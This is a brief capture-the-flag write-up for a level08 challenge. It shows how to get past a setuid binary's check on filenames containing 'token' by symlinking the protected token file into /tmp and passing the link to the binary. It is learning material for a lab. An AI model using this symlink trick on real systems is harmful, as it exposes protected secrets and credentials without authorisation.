# In the home repository we can found a level08 binary that will be executed by flag08 user by owner and group

# With strings we can see that the binary is waiting for an argument (a file thanks to the error message) and it will read in it
# The second file that we have is named 'token' in the home repository, only the flag08 can open it directly
# The idea is to give a file that level08 have access to the level08 binary
# Create a symlink of ~/token in /tmp folder (we can write in)

ln -s ~/token /tmp/flag

# The symlink name musn't contains 'token', the program will check for that.
# Once the symlink is done, just give the symlink path into the binary, it will read into token file

cd ~
./level08 /tmp/flag
